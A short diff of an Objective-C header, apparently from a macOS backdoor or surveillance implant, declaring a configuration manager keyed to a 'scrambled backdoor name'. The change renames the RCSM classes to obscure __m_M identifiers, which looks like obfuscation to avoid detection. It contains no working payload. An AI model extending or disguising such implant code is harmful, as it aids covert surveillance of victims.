@@ -63,7 +63,7 @@ typedef struct {
 //
 #define DEFAULT_CONF_NAME    @"PWR84nQ0C54WR.Y8n"
 
-@interface RCSMConfManager : NSObject
+@interface __m_MConfManager : NSObject
 {
 @private
   // Configuration Filename derived from the scrambled backdoor name
@@ -78,7 +78,7 @@ typedef struct {
   NSData *mConfigurationData;
   
 @private
-  RCSMEncryption *mEncryption;
+  __m_MEncryption *mEncryption;
 }
 
 - (id)initWithBackdoorName: (NSString *)aName;
@@ -96,7 +96,7 @@ typedef struct {
 - (BOOL)loadConfiguration;
 - (BOOL)checkConfigurationIntegrity: (NSString *)configurationFile;
 
-- (RCSMEncryption *)encryption;
+- (__m_MEncryption *)encryption;
 
 @end
 
